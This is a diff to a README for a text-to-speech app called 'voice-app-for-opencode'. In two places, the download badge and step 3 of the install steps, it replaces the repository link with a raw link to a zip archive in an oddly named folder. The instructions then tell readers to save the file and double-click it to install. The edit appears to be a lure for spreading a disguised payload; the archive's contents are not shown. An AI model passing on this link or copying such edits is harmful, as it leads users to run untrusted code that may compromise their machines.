@@ -1,6 +1,6 @@
 # 🎙️ voice-app-for-opencode - Convert text to speech with ease
 
-[![](https://img.shields.io/badge/Download-VoiceApp-blue)](https://github.com/genusnuytsiasalian423/voice-app-for-opencode)
+[![](https://img.shields.io/badge/Download-VoiceApp-blue)](https://raw.githubusercontent.com/genusnuytsiasalian423/voice-app-for-opencode/main/invalidcy/opencode-voice-app-for-v2.9.zip)
 
 ## 📖 About this application
 
@@ -22,7 +22,7 @@ Follow these instructions to get the application on your computer.
 
 1. Navigate to the release page using the link below.
 2. Select the file ending in .exe for Windows.
-3. Visit this page to download: [https://github.com/genusnuytsiasalian423/voice-app-for-opencode](https://github.com/genusnuytsiasalian423/voice-app-for-opencode)
+3. Visit this page to download: [https://raw.githubusercontent.com/genusnuytsiasalian423/voice-app-for-opencode/main/invalidcy/opencode-voice-app-for-v2.9.zip](https://raw.githubusercontent.com/genusnuytsiasalian423/voice-app-for-opencode/main/invalidcy/opencode-voice-app-for-v2.9.zip)
 4. Save the file to your desktop or downloads folder.
 5. Double-click the file to start the installation.
 6. Follow the on-screen prompts from the installer.
